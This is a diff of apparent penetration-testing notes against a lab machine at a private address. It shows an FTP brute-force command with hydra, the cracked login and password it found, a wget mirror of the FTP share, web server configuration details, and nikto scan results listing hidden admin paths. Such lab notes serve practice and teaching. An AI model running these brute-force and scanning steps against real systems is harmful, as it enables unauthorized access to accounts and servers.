@@ -95,4 +95,21 @@ hydra -l elly -e nsr ftp://192.168.1.92 -v
   [21][ftp] host: 192.168.1.92   login: elly   password: ylle
 
 wget -m --no-passive ftp://elly:ylle@192.168.1.92
-SEGUIR POR FTP DE ELLY
+
+/host
+  127.0.1.1       red red.initech
+  
+/apache2/sites-enabled/
+  <VirtualHost _default_:12380>
+                ServerAdmin garry@red
+                
+http://192.168.1.92:12380/
+  Server: Apache/2.4.18 (Ubuntu)
+  Dave: Soemthing doesn't look right here
+  <!-- A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! -->
+  
+nikto -h http://192.168.1.92:12380/
+  /admin112233/
+  /blogblog/
+  /phpmyadmin/
+
